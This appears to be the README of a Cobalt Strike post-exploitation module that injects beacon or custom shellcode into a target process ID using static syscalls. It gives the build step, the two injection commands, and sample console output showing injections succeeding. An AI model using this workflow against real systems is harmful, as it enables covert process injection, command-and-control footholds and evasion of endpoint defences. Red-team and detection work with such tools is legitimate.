
## Compile

```
make
```

## Usage

- `static_syscalls_inject PID listener_name` - Injects shellcode for beacon into target PID. 
- `static_syscalls_shinject PID path_to_bin` - Injects custom shellcode into target PID.

> NOTE: BOF is for 64-bit use only.

### Custom shellcode
```
beacon> static_syscalls_shinject 4052 C:\Users\user\shellcode\calc.bin
[*] Static Syscalls Shellcode Injection BOF (@ajpc500)
[*] Reading shellcode from: C:\Users\user\shellcode\calc.bin
[+] host called home, sent: 4824 bytes
[+] received output:
Shellcode injection completed successfully!
```

### Beacon shellcode
```
beacon> static_syscalls_inject 4972 http
[*] Static Syscalls Shellcode Injection BOF (@ajpc500)
[*] Using http listener for beacon shellcode generation.
[+] host called home, sent: 266180 bytes
[+] received output:
Shellcode injection completed successfully!
```
